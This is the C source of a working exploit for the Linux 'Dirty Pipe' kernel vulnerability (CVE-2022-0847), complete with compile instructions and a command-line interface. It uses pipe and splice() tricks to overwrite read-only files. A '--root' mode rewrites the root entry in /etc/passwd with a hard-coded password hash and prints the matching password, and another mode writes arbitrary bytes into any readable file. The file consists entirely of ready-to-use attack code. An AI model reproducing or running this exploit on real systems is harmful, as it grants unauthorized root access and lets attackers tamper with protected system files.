/*
 *
 * Dirty Pipe
 * vulnerability (CVE-2022-0847)
 *
 * Compile as static binary:
 * gcc -o dpipe dpipe.c -static
 *
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <limits.h>


static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    if (pipe_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get pipe size");
        abort();
    }
    printf("[Dirty Pipe] Pipe size determined: %u bytes\n", pipe_size);

    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    printf("[Dirty Pipe] Filling the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe filled successfully.\n");

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    printf("[Dirty Pipe] Draining the pipe...\n");
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
    printf("[Dirty Pipe] Pipe drained successfully.\n");

    /* the pipe is now empty, and if somebody adds a new
       pipe_buffer without initializing its "flags", the buffer
       will be mergeable */
}


int backup_file(const char *src_path)
{
    char *filename = basename(strdupa(src_path));

    char dst_path[PATH_MAX];
    snprintf(dst_path, sizeof(dst_path), "/tmp/%s.bak", filename);

    printf("[Dirty Pipe] Attempting to backup '%s' to '%s'\n", src_path, dst_path);

    FILE *f1 = fopen(src_path, "r");
    if (f1 == NULL)
    {
        perror("[Dirty Pipe] Error opening source file for reading");
        return EXIT_FAILURE;
    }

    FILE *f2 = fopen(dst_path, "w");
    if (f2 == NULL)
    {
        fclose(f1);
        perror("[Dirty Pipe] Error opening destination file for writing");
        return EXIT_FAILURE;
    }

    char c;
    while ((c = fgetc(f1)) != EOF)
        fputc(c, f2);

    fclose(f1);
    fclose(f2);

    printf("[Dirty Pipe] Successfully backed up '%s' to '%s'\n", src_path, dst_path);
    return EXIT_SUCCESS;
}

int write_to_file(const char *path, loff_t offset, const char *data)
{
    printf("[Dirty Pipe] Initiating write to '%s'...\n", path);

    const size_t data_size = strlen(data);
    printf("[Dirty Pipe] Data size to write: %zu bytes\n", data_size);

    long page_size = sysconf(_SC_PAGESIZE);

    if (page_size == -1) {
        perror("[Dirty Pipe] Error: Failed to get page size");
        exit(EXIT_FAILURE);
    }

    if (offset % page_size == 0) {
        fprintf(stderr, "[Dirty Pipe] Error: Writing cannot start at a page boundary.\n");
        exit(EXIT_FAILURE);
    }

    const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    const loff_t end_offset = offset + (loff_t)data_size;

    // Ensure we're not writing across a page boundary.
    if (end_offset > next_page) {
		fprintf(stderr, "[Dirty Pipe] Error: Writing cannot cross a page boundary.\n");
		return EXIT_FAILURE;
	}

	// Open the file for reading.
	const int fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("[Dirty Pipe] Error: Failed to open the file");
		return EXIT_FAILURE;
	}
    printf("[Dirty Pipe] File '%s' opened successfully for reading.\n", path);

	// Get file statistics.
	struct stat st;
	if (fstat(fd, &st)) {
		perror("[Dirty Pipe] Error: Failed to retrieve file stats");
		return EXIT_FAILURE;
	}

    // Check if the offset is inside the file.
	if (offset > st.st_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Specified offset is beyond the file size.\n");
		return EXIT_FAILURE;
	}

    // Ensure writing won't enlarge the file.
	if (end_offset > st.st_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Writing will enlarge the file, which is not allowed.\n");
		return EXIT_FAILURE;
	}

    // Create a pipe for data transfer.
	int p[2];
	prepare_pipe(p);

    // Adjust the offset by decreasing it.
	--offset;

    // Use splice() to move data within the filesystem.
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("[Dirty Pipe] Error: Splice operation failed");
		return EXIT_FAILURE;
	}
	if (nbytes == 0) {
		fprintf(stderr, "[Dirty Pipe] Error: Splice operation transferred fewer bytes than expected.\n");
		return EXIT_FAILURE;
	}

    // Write the actual data to the pipe.
	nbytes = write(p[1], data, data_size);
	if (nbytes < 0) {
		perror("[Dirty Pipe] Error: Failed to write data to the pipe");
		return EXIT_FAILURE;
	}
	if ((size_t)nbytes < data_size) {
		fprintf(stderr, "[Dirty Pipe] Error: Wrote fewer bytes to the pipe than expected.\n");
		return EXIT_FAILURE;
	}
    printf("[Dirty Pipe] Data successfully written to '%s'.\n", path);

    return EXIT_SUCCESS;
}

void print_help(const char *progname) {
    fprintf(stderr, "Usage:\n");
    fprintf(stderr, "  %s [--no-backup] [--root]\n", progname);
    fprintf(stderr, "  %s [--no-backup] <file_path> <offset> <data>\n", progname);
    fprintf(stderr, "\nOptions:\n");
    fprintf(stderr, "  --no-backup  Do not create a backup of the file before writing.\n");
    fprintf(stderr, "  --root        Apply root exploit on /etc/passwd.\n");
}

void handle_root_exploit(int no_backup) {
    if (!no_backup && backup_file("/etc/passwd") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file("/etc/passwd", 4, ":$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh\n") != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
    printf("[Dirty Pipe] You can connect as root with password 'el3ph@nt!'\n");
}

void handle_custom_file(int no_backup, char *argv[], int index_shift) {
    const char *file_path = argv[1 + index_shift];
    loff_t offset = strtoll(argv[2 + index_shift], NULL, 10);
    const char *data = argv[3 + index_shift];

    if (!no_backup && backup_file(file_path) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Backup failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }

    if (write_to_file(file_path, offset, data) != EXIT_SUCCESS) {
        fprintf(stderr, "[Dirty Pipe] Error: Write operation failed. Aborting...\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[])
{
    int no_backup = 0;
    int index_shift = 0;

    // Check for the --no-backup option.
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-backup") == 0) {
            no_backup = 1;
            index_shift++;
        }
        // Check for help flags.
        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            print_help(argv[0]);
            return EXIT_SUCCESS;
        }
    }

    if (argc < 2 + index_shift)
    {
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    if (strcmp(argv[1 + index_shift], "--root") == 0) {
        handle_root_exploit(no_backup);
    } else if (argc == 4 + index_shift) {
        handle_custom_file(no_backup, argv, index_shift);
    } else {
        fprintf(stderr, "[Dirty Pipe] Error: Invalid arguments!\n");
        print_help(argv[0]);
        exit(EXIT_FAILURE);
    }

    printf("[Dirty Pipe] Program execution completed successfully.\n");
    return EXIT_SUCCESS;
}
